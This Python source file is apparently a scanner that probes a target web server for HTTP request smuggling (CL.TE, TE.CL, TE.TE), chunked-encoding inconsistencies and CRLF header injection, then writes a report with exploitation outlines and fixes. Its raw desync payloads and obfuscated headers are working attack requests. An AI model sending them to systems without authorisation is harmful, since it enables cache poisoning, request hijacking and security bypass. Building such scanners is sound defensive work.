#!/usr/bin/env python3
"""
HTTP Request Smuggling Detection Scanner
Detects CL.TE, TE.CL, TE.TE request smuggling vulnerabilities and HTTP desync attacks
"""

from colorama import Fore
import socket
import ssl
import time
import os
import re
from urllib.parse import urlparse
from typing import Dict, List, Tuple, Optional, Any
import logging

# Set up logging
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)


class RequestSmugglingScanner:
    """
    HTTP Request Smuggling and Desync Attack Detection Scanner
    
    Detects three main types of smuggling:
    - CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
    - TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
    - TE.TE: Both use Transfer-Encoding but handle it differently
    """
    
    def __init__(self, target_url: str):
        self.target = target_url.rstrip('/')
        self.parsed_url = urlparse(self.target)
        self.hostname = self.parsed_url.netloc.split(':')[0]
        self.port = self._get_port()
        self.use_ssl = self.parsed_url.scheme == 'https'
        self.findings = []
        
        # Timing thresholds for desync detection (increased for accuracy)
        self.timing_threshold = 5.0  # seconds (more reliable threshold)
        self.baseline_timing = None
        self.baseline_samples = []
        
        # Server info for better detection
        self.server_info = None
        self.http_version = None
        self.uses_waf = False
        self.waf_type = None
        
    def _get_port(self) -> int:
        """Get port from URL or use default"""
        if ':' in self.parsed_url.netloc:
            return int(self.parsed_url.netloc.split(':')[1])
        return 443 if self.parsed_url.scheme == 'https' else 80
    
    def _create_socket(self) -> socket.socket:
        """Create socket connection with optional SSL"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        if self.use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=self.hostname)
        
        sock.connect((self.hostname, self.port))
        return sock
    
    def _send_request(self, request: bytes) -> Tuple[bytes, float]:
        """Send raw HTTP request and measure response time"""
        try:
            sock = self._create_socket()
            start_time = time.time()
            sock.sendall(request)
            
            response = b''
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    # Stop if we got a complete response
                    if b'\r\n\r\n' in response and (
                        b'Content-Length: 0' in response or
                        len(response.split(b'\r\n\r\n', 1)[1]) > 0
                    ):
                        break
                except socket.timeout:
                    break
            
            elapsed_time = time.time() - start_time
            sock.close()
            return response, elapsed_time
            
        except Exception as e:
            logger.error(f"Error sending request: {e}")
            return b'', 0.0
    
    def _detect_server_info(self):
        """Detect server type, HTTP version, and WAF presence"""
        try:
            sock = self._create_socket()
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.hostname}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            
            sock.sendall(request)
            response = b''
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if b'\r\n\r\n' in response:
                        break
            except socket.timeout:
                pass
            sock.close()
            
            # Parse response
            if response:
                headers = response.split(b'\r\n\r\n')[0].decode('utf-8', errors='ignore')
                lines = headers.split('\r\n')
                
                # Check HTTP version
                if lines:
                    status_line = lines[0]
                    if 'HTTP/2' in status_line:
                        self.http_version = 'HTTP/2'
                    elif 'HTTP/1.1' in status_line:
                        self.http_version = 'HTTP/1.1'
                    elif 'HTTP/1.0' in status_line:
                        self.http_version = 'HTTP/1.0'
                
                # Check for WAF/CDN signatures
                headers_lower = headers.lower()
                waf_signatures = {
                    'cloudflare': ['server: cloudflare', 'cf-ray:', '__cfduid'],
                    'akamai': ['server: akamaighost', 'akamai'],
                    'aws': ['x-amz-', 'x-amzn-', 'server: awselb'],
                    'fastly': ['x-fastly', 'fastly'],
                    'incapsula': ['x-cdn: incapsula', 'incap_ses'],
                    'sucuri': ['x-sucuri-id', 'sucuri'],
                    'mod_security': ['mod_security', 'modsecurity'],
                    'barracuda': ['barra_counter_session'],
                    'f5': ['bigip', 'f5-trafficshield'],
                    'fortiweb': ['fortigate', 'fortiweb'],
                }
                
                for waf_name, signatures in waf_signatures.items():
                    for sig in signatures:
                        if sig in headers_lower:
                            self.uses_waf = True
                            self.waf_type = waf_name
                            break
                    if self.uses_waf:
                        break
                
                # Extract server header
                for line in lines:
                    if line.lower().startswith('server:'):
                        self.server_info = line.split(':', 1)[1].strip()
                        break
                        
        except Exception as e:
            logger.error(f"Error detecting server info: {e}")
    
    def _get_baseline_timing(self):
        """Establish baseline response timing with multiple samples"""
        print(f"{Fore.CYAN}[*] Establishing baseline timing...{Fore.RESET}", end='', flush=True)
        
        normal_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.hostname}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        
        timings = []
        for _ in range(5):  # Increased samples for better accuracy
            _, elapsed = self._send_request(normal_request)
            if elapsed > 0:
                timings.append(elapsed)
        
        if timings:
            self.baseline_samples = timings
            self.baseline_timing = sum(timings) / len(timings)
            max_baseline = max(timings)
            print(f" {Fore.GREEN}Done (avg: {self.baseline_timing:.2f}s, max: {max_baseline:.2f}s){Fore.RESET}")
        else:
            self.baseline_timing = 1.0
            print(f" {Fore.YELLOW}Warning: Could not establish baseline{Fore.RESET}")
    
    def scan_request_smuggling(self):
        """Main request smuggling scanning function"""
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}Starting HTTP Request Smuggling Scan...{Fore.RESET}")
        
        try:
            # Detect server info first
            print(f"{Fore.CYAN}[*] Detecting server configuration...{Fore.RESET}", end='', flush=True)
            self._detect_server_info()
            
            # Display server info
            if self.server_info or self.http_version or self.uses_waf:
                print(f" {Fore.GREEN}Done{Fore.RESET}")
                if self.server_info:
                    print(f"    {Fore.CYAN}Server:{Fore.RESET} {self.server_info}")
                if self.http_version:
                    print(f"    {Fore.CYAN}HTTP Version:{Fore.RESET} {self.http_version}")
                if self.uses_waf:
                    print(f"    {Fore.YELLOW}WAF/CDN Detected:{Fore.RESET} {self.waf_type.upper()}")
            else:
                print(f" {Fore.YELLOW}Could not detect{Fore.RESET}")
            
            # Check if HTTP/2 (not vulnerable to classic smuggling)
            if self.http_version == 'HTTP/2':
                print(f"\n{Fore.YELLOW}[!] Server uses HTTP/2 - Classic HTTP/1.1 request smuggling not applicable{Fore.RESET}")
                print(f"{Fore.YELLOW}[!] Skipping smuggling tests (HTTP/2 has different architecture){Fore.RESET}")
                return
            
            # Warn about WAF false positives
            if self.uses_waf:
                print(f"\n{Fore.YELLOW}[!] WAF/CDN detected - This may cause false positives{Fore.RESET}")
                print(f"{Fore.YELLOW}[!] {self.waf_type.upper()} typically has anti-smuggling protection{Fore.RESET}")
            
            # Get baseline timing
            self._get_baseline_timing()
            
            # Test different smuggling techniques
            self.test_cl_te_smuggling()
            self.test_te_cl_smuggling()
            self.test_te_te_smuggling()
            self.test_chunked_encoding_variations()
            self.test_header_smuggling()
            
            print(f"{Fore.GREEN}[+] Request Smuggling Scan Complete!{Fore.RESET}")
            
        except Exception as e:
            logger.error(f"Error in request smuggling scan: {e}")
            print(f" {Fore.RED}Error: {str(e)}{Fore.RESET}")
    
    def test_cl_te_smuggling(self):
        """
        Test CL.TE smuggling vulnerability (IMPROVED DETECTION)
        Front-end uses Content-Length, back-end uses Transfer-Encoding
        """
        print(f"{Fore.CYAN}[*] Testing CL.TE smuggling...{Fore.RESET}", end='', flush=True)
        
        # Classic CL.TE payload
        smuggled_request = "GPOST / HTTP/1.1\r\nHost: evil.com\r\n\r\n"
        
        request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.hostname}\r\n"
            f"Content-Length: {len(smuggled_request)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"{smuggled_request}"
        ).encode()
        
        try:
            # First, send baseline request to compare
            baseline_request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.hostname}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            baseline_response, _ = self._send_request(baseline_request)
            baseline_status = self._get_status_code(baseline_response)
            
            # Send smuggling payload
            response1, time1 = self._send_request(request)
            status1 = self._get_status_code(response1)
            
            # Send a normal follow-up request
            time.sleep(0.5)
            response2, time2 = self._send_request(baseline_request)
            status2 = self._get_status_code(response2)
            
            # IMPROVED DETECTION: Only flag if follow-up differs from baseline
            # AND we see actual evidence of smuggling (not just errors)
            if response2 and b'GPOST' in response2:
                # This is the smoking gun - our smuggled verb appeared
                self.findings.append({
                    'type': 'CL.TE Request Smuggling',
                    'severity': 'Critical',
                    'technique': 'Content-Length vs Transfer-Encoding',
                    'details': 'Front-end uses Content-Length, back-end uses Transfer-Encoding. Request smuggling confirmed.',
                    'evidence': f'Smuggled "GPOST" verb appeared in follow-up response',
                    'impact': 'Can bypass security controls, poison caches, hijack other users\' requests'
                })
                print(f" {Fore.RED}VULNERABLE!{Fore.RESET}")
                return
            
            # Check if follow-up differs from baseline (not just error codes)
            if baseline_status and status2 and baseline_status != status2:
                if status2 in ['404', '400'] and baseline_status not in ['404', '400']:
                    # Only flag if baseline was OK but follow-up got error
                    # AND timing suggests smuggling (not immediate rejection)
                    if time1 > 3.0 or time2 > 3.0:  # Suspicious timing
                        self.findings.append({
                            'type': 'CL.TE Request Smuggling (Possible)',
                            'severity': 'Medium',
                            'technique': 'Content-Length vs Transfer-Encoding',
                            'details': 'Possible request smuggling - follow-up request behavior changed',
                            'evidence': f'Baseline: {baseline_status}, Follow-up: {status2}, Time anomaly detected',
                            'impact': 'Requires manual verification - may be WAF behavior',
                            'note': 'This could be a false positive if WAF/CDN is present'
                        })
                        print(f" {Fore.YELLOW}POSSIBLE (needs verification){Fore.RESET}")
                        return
            
        except Exception as e:
            logger.error(f"CL.TE test error: {e}")
        
        print(f" {Fore.GREEN}Not vulnerable{Fore.RESET}")
    
    def _get_status_code(self, response: bytes) -> Optional[str]:
        """Extract HTTP status code from response"""
        try:
            if response and len(response) > 12:
                status_line = response.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                parts = status_line.split(' ')
                if len(parts) >= 2:
                    return parts[1]
        except:
            pass
        return None
    
    def test_te_cl_smuggling(self):
        """
        Test TE.CL smuggling vulnerability (IMPROVED DETECTION)
        Front-end uses Transfer-Encoding, back-end uses Content-Length
        """
        print(f"{Fore.CYAN}[*] Testing TE.CL smuggling...{Fore.RESET}", end='', flush=True)
        
        # TE.CL payload - back-end stops reading after Content-Length
        request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.hostname}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Host: {self.hostname}\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        
        try:
            response1, time1 = self._send_request(request)
            
            # Check for SIGNIFICANT timing anomalies (not just 2 seconds)
            # Real smuggling causes 5-10+ second delays
            if time1 > (self.baseline_timing + self.timing_threshold):
                # Verify it's not just network issue by checking if it's consistently slow
                if self.baseline_samples and time1 > (max(self.baseline_samples) + 3.0):
                    self.findings.append({
                        'type': 'TE.CL Request Smuggling',
                        'severity': 'Critical',
                        'technique': 'Transfer-Encoding vs Content-Length',
                        'details': 'Front-end uses Transfer-Encoding, back-end uses Content-Length. Request smuggling possible.',
                        'evidence': f'Significant timing anomaly: {time1:.2f}s vs baseline {self.baseline_timing:.2f}s',
                        'impact': 'Can bypass security controls, poison caches, hijack other users\' requests',
                        'note': 'Verify manually - timing alone can have false positives'
                    })
                    print(f" {Fore.RED}VULNERABLE (Timing: {time1:.2f}s)!{Fore.RESET}")
                    return
            
            # Try follow-up request
            time.sleep(0.5)
            normal_request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.hostname}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            
            response2, time2 = self._send_request(normal_request)
            
            # Check if follow-up contains our smuggled data (smoking gun)
            if response2 and b'GPOST' in response2:
                self.findings.append({
                    'type': 'TE.CL Request Smuggling',
                    'severity': 'Critical',
                    'technique': 'Transfer-Encoding vs Content-Length',
                    'details': 'Request smuggling confirmed via follow-up request contamination',
                    'evidence': 'Smuggled "GPOST" verb appeared in follow-up response',
                    'impact': 'Can bypass security controls, poison caches, hijack other users\' requests'
                })
                print(f" {Fore.RED}VULNERABLE!{Fore.RESET}")
                return
                
        except Exception as e:
            logger.error(f"TE.CL test error: {e}")
        
        print(f" {Fore.GREEN}Not vulnerable{Fore.RESET}")
    
    def test_te_te_smuggling(self):
        """
        Test TE.TE smuggling vulnerability (IMPROVED DETECTION)
        Both front-end and back-end use Transfer-Encoding but parse it differently
        """
        print(f"{Fore.CYAN}[*] Testing TE.TE smuggling...{Fore.RESET}", end='', flush=True)
        
        # Try various obfuscated Transfer-Encoding headers
        obfuscations = [
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding\t: chunked",
            "Transfer-Encoding: chunked ",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: identity",
            " Transfer-Encoding: chunked",
        ]
        
        for obfuscation in obfuscations:
            request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.hostname}\r\n"
                f"{obfuscation}\r\n"
                f"Content-Length: 4\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\n"
                f"Host: {self.hostname}\r\n"
                f"Content-Length: 15\r\n"
                f"\r\n"
                f"x=1\r\n"
                f"0\r\n"
                f"\r\n"
            ).encode()
            
            try:
                response, elapsed = self._send_request(request)
                
                # Check for SIGNIFICANT timing differences (5+ seconds)
                if elapsed > (self.baseline_timing + self.timing_threshold):
                    if self.baseline_samples and elapsed > (max(self.baseline_samples) + 3.0):
                        self.findings.append({
                            'type': 'TE.TE Request Smuggling',
                            'severity': 'Critical',
                            'technique': 'Dual Transfer-Encoding Obfuscation',
                            'details': f'Different parsing of Transfer-Encoding headers: {obfuscation}',
                            'evidence': f'Significant timing anomaly: {elapsed:.2f}s vs baseline {self.baseline_timing:.2f}s',
                            'impact': 'Can bypass security controls, poison caches, hijack other users\' requests',
                            'note': 'Verify manually - timing alone can have false positives'
                        })
                        print(f" {Fore.RED}VULNERABLE!{Fore.RESET}")
                        return
                    
            except Exception as e:
                logger.error(f"TE.TE test error: {e}")
        
        print(f" {Fore.GREEN}Not vulnerable{Fore.RESET}")
    
    def test_chunked_encoding_variations(self):
        """Test various chunked encoding edge cases"""
        print(f"{Fore.CYAN}[*] Testing chunked encoding variations...{Fore.RESET}", end='', flush=True)
        
        # Test invalid chunk sizes
        variations = [
            # Missing chunk size
            (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.hostname}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"\r\n"  # Missing chunk size
                f"0\r\n"
                f"\r\n"
            ),
            # Hex with spaces
            (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.hostname}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"5 \r\n"
                f"hello\r\n"
                f"0\r\n"
                f"\r\n"
            ),
            # Chunk extension abuse
            (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.hostname}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"5;abc=def\r\n"
                f"hello\r\n"
                f"0\r\n"
                f"\r\n"
            ),
        ]
        
        anomalies = 0
        for request in variations:
            try:
                response, elapsed = self._send_request(request.encode())
                
                # Check for unexpected behavior
                if b'400' in response or elapsed > (self.baseline_timing + 1.0):
                    anomalies += 1
                    
            except Exception as e:
                pass
        
        if anomalies > 0:
            self.findings.append({
                'type': 'Chunked Encoding Inconsistency',
                'severity': 'Medium',
                'details': f'Server handles malformed chunked encoding inconsistently ({anomalies} anomalies)',
                'evidence': 'Different responses to malformed chunk sizes',
                'impact': 'Potential for desync attacks'
            })
            print(f" {Fore.YELLOW}Inconsistencies detected{Fore.RESET}")
        else:
            print(f" {Fore.GREEN}Consistent{Fore.RESET}")
    
    def test_header_smuggling(self):
        """Test for header smuggling via newline injection"""
        print(f"{Fore.CYAN}[*] Testing header smuggling...{Fore.RESET}", end='', flush=True)
        
        # Try to inject headers via various fields
        payloads = [
            f"test\r\nTransfer-Encoding: chunked",
            f"test\nTransfer-Encoding: chunked",
            f"test\r\n X-Foo: bar",
            f"test%0d%0aTransfer-Encoding: chunked",
        ]
        
        for payload in payloads:
            request = (
                f"GET /?param={payload} HTTP/1.1\r\n"
                f"Host: {self.hostname}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            
            try:
                response, elapsed = self._send_request(request)
                
                # Check if injected headers were processed
                if b'Transfer-Encoding' in response or b'X-Foo' in response:
                    self.findings.append({
                        'type': 'Header Injection via Newline',
                        'severity': 'High',
                        'details': 'HTTP headers can be injected via newline characters in parameters',
                        'evidence': f'Injected payload: {payload}',
                        'impact': 'Can lead to request smuggling, cache poisoning, or session fixation'
                    })
                    print(f" {Fore.YELLOW}VULNERABLE!{Fore.RESET}")
                    return
                    
            except Exception as e:
                pass
        
        print(f" {Fore.GREEN}Not vulnerable{Fore.RESET}")
    
    def generate_report(self):
        """Generate comprehensive request smuggling report"""
        output_dir = os.path.join(os.path.dirname(__file__), '..', 'output')
        os.makedirs(output_dir, exist_ok=True)
        
        target_name = self.hostname.replace('.', '_')
        report_file = os.path.join(output_dir, f'request_smuggling_{target_name}.txt')
        
        with open(report_file, 'w') as f:
            f.write("=" * 75 + "\n")
            f.write("HTTP REQUEST SMUGGLING & DESYNC DETECTION REPORT\n")
            f.write("=" * 75 + "\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Hostname: {self.hostname}\n")
            f.write(f"Port: {self.port}\n")
            f.write(f"Protocol: {'HTTPS' if self.use_ssl else 'HTTP'}\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 75 + "\n\n")
            
            if not self.findings:
                f.write("✅ No HTTP request smuggling vulnerabilities detected!\n\n")
                f.write("WHAT IS REQUEST SMUGGLING?\n")
                f.write("-" * 75 + "\n")
                f.write("HTTP Request Smuggling occurs when front-end and back-end servers\n")
                f.write("disagree about where one request ends and another begins. This can\n")
                f.write("allow attackers to bypass security controls, poison caches, and\n")
                f.write("hijack other users' requests.\n\n")
                f.write("TYPES OF SMUGGLING:\n")
                f.write("-" * 75 + "\n")
                f.write("• CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding\n")
                f.write("• TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length\n")
                f.write("• TE.TE: Both use Transfer-Encoding but parse it differently\n\n")
                print(f"{Fore.GREEN}[+] Request smuggling report saved to: {report_file}{Fore.RESET}")
                print(f"{Fore.GREEN}[+] No request smuggling vulnerabilities found!{Fore.RESET}")
                return
            
            # Group findings by severity
            severity_count = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
            for finding in self.findings:
                severity_count[finding['severity']] += 1
            
            f.write("⚠️  VULNERABILITIES FOUND:\n")
            f.write("-" * 75 + "\n")
            for severity in ['Critical', 'High', 'Medium', 'Low']:
                count = severity_count[severity]
                if count > 0:
                    f.write(f"{severity}: {count} issue(s)\n")
            f.write("\n")
            
            # Detailed findings
            f.write("DETAILED FINDINGS:\n")
            f.write("-" * 75 + "\n\n")
            
            for i, finding in enumerate(self.findings, 1):
                f.write(f"{i}. [{finding['severity']}] {finding['type']}\n")
                if 'technique' in finding:
                    f.write(f"   Technique: {finding['technique']}\n")
                if 'details' in finding:
                    f.write(f"   Details: {finding['details']}\n")
                if 'evidence' in finding:
                    f.write(f"   Evidence: {finding['evidence']}\n")
                if 'impact' in finding:
                    f.write(f"   Impact: {finding['impact']}\n")
                f.write("\n")
            
            # Exploitation guidance
            if any(f['severity'] == 'Critical' for f in self.findings):
                f.write("\n🚨 EXPLOITATION POTENTIAL:\n")
                f.write("-" * 75 + "\n\n")
                
                if any('CL.TE' in f['type'] for f in self.findings):
                    f.write("• CL.TE Exploitation:\n")
                    f.write("  1. Send smuggled request that front-end sees as complete\n")
                    f.write("  2. Back-end processes remaining data as new request\n")
                    f.write("  3. Next user's request gets appended to smuggled request\n")
                    f.write("  4. Can steal cookies, bypass auth, poison caches\n\n")
                
                if any('TE.CL' in f['type'] for f in self.findings):
                    f.write("• TE.CL Exploitation:\n")
                    f.write("  1. Front-end processes chunked encoding\n")
                    f.write("  2. Back-end uses Content-Length and stops early\n")
                    f.write("  3. Remaining data treated as next request\n")
                    f.write("  4. Can execute arbitrary requests in victim's context\n\n")
                
                if any('TE.TE' in f['type'] for f in self.findings):
                    f.write("• TE.TE Exploitation:\n")
                    f.write("  1. Obfuscate Transfer-Encoding header\n")
                    f.write("  2. One server accepts it, other rejects it\n")
                    f.write("  3. Creates desync condition\n")
                    f.write("  4. Similar impact to CL.TE/TE.CL\n\n")
            
            # Recommendations
            f.write("\nRECOMMENDATIONS:\n")
            f.write("-" * 75 + "\n")
            
            if severity_count['Critical'] > 0:
                f.write("\n🚨 CRITICAL PRIORITY:\n\n")
                f.write("1. **Normalize HTTP Processing:**\n")
                f.write("   - Ensure front-end and back-end agree on request boundaries\n")
                f.write("   - Use the same HTTP parsing library across all layers\n")
                f.write("   - Reject ambiguous requests (both CL and TE present)\n\n")
                
                f.write("2. **Disable Connection Reuse:**\n")
                f.write("   - Don't reuse back-end connections for multiple requests\n")
                f.write("   - Use HTTP/2 which is less susceptible to smuggling\n")
                f.write("   - Close connections after each request\n\n")
                
                f.write("3. **Strict Header Validation:**\n")
                f.write("   - Reject requests with duplicate CL/TE headers\n")
                f.write("   - Validate chunk sizes strictly\n")
                f.write("   - Reject malformed chunked encoding\n\n")
                
                f.write("4. **WAF Configuration:**\n")
                f.write("   - Configure WAF to reject ambiguous requests\n")
                f.write("   - Enable request smuggling detection rules\n")
                f.write("   - Log all HTTP parsing errors\n\n")
            
            if severity_count['High'] > 0 or severity_count['Medium'] > 0:
                f.write("\n⚠️  HIGH/MEDIUM PRIORITY:\n\n")
                f.write("• Implement comprehensive HTTP request validation\n")
                f.write("• Use HTTP/2 where possible (less vulnerable)\n")
                f.write("• Regular security audits of proxy configurations\n")
                f.write("• Monitor for unusual HTTP patterns\n\n")
            
            f.write("\nGENERAL SECURITY BEST PRACTICES:\n")
            f.write("-" * 75 + "\n")
            f.write("1. Keep all HTTP servers and proxies updated\n")
            f.write("2. Use HTTP/2 which handles framing differently\n")
            f.write("3. Implement strict HTTP specification compliance\n")
            f.write("4. Don't allow ambiguous or malformed requests\n")
            f.write("5. Use a single HTTP parsing library across all layers\n")
            f.write("6. Monitor for desync conditions and timing anomalies\n")
            f.write("7. Regular penetration testing for smuggling vulnerabilities\n")
            f.write("8. Implement defense-in-depth security controls\n\n")
            
            f.write("REFERENCES:\n")
            f.write("-" * 75 + "\n")
            f.write("• PortSwigger: HTTP Request Smuggling\n")
            f.write("  https://portswigger.net/web-security/request-smuggling\n")
            f.write("• OWASP: HTTP Request Smuggling\n")
            f.write("• James Kettle: HTTP Desync Attacks Research\n")
        
        print(f"{Fore.GREEN}[+] Request smuggling report saved to: {report_file}{Fore.RESET}")
        
        # Console summary
        if self.findings:
            critical_count = severity_count['Critical']
            if critical_count > 0:
                print(f"{Fore.RED}[!] CRITICAL: Found {critical_count} request smuggling vulnerabilities!{Fore.RESET}")
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}Total findings: {len(self.findings)} ({severity_count['Critical']} Critical, {severity_count['High']} High, {severity_count['Medium']} Medium){Fore.RESET}")
        else:
            print(f"{Fore.GREEN}[+] No request smuggling vulnerabilities found!{Fore.RESET}")


def request_smuggling_scan(target: str):
    """Main function to run HTTP request smuggling scan"""
    scanner = RequestSmugglingScanner(target)
    scanner.scan_request_smuggling()
    scanner.generate_report()
    return scanner.findings

